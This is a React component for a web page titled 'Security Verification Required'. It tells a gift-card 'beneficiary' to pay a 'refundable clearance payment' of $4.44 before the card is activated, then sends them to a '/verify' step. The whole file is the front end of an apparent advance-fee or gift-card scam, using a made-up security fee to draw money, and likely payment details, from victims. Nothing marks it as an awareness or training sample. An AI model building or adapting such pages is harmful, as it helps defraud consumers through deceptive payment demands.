import React from 'react';
import { useNavigate } from 'react-router-dom';

const Clearance = () => {
    const navigate = useNavigate();

    return (
        <div className="container">
            <div className="content">
                <h1>Security Verification Required</h1>
                <p>
                    For security and verification purposes, the beneficiary is required to complete a refundable clearance payment of $4.44 before the gift card can be activated and redeemed.
                </p>
                <p>
                    This step helps protect transactions and confirm the recipient's identity before final delivery access is granted.
                </p>
                
                <div className="payment-info">
                    Required Clearance Payment: $4.44
                </div>

                <button onClick={() => navigate('/verify')} className="btn">
                    Proceed to Clearance
                </button>
                
                <div className="footer">
                    &copy; 2026 Security Verification Service. All rights reserved.
                </div>
            </div>
        </div>
    );
};

export default Clearance;
